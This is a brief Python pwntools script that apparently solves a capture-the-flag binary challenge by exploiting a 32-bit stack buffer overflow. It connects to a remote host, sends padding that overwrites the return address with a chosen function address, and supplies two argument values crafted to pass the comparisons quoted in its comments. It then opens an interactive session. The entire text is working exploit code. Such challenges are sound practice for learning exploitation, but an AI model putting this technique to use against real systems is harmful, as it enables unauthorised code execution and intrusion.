from pwn import*
p = remote('46.101.17.92',30051)
#p = process("./vuln")
#gdb.attach(p, api=True) 
#  ebp			ebp + 0x4
payload = b"A"*188 + p32(0x080491e2) + b"A"*4+ p32(0xdeadbeef) + p32(0xc0ded00d)
p.sendline(payload)
p.interactive()

#cmp    DWORD PTR [ebp+0x8],0xdeadbeef
#cmp    DWORD PTR [ebp+0xc],0xc0ded00d
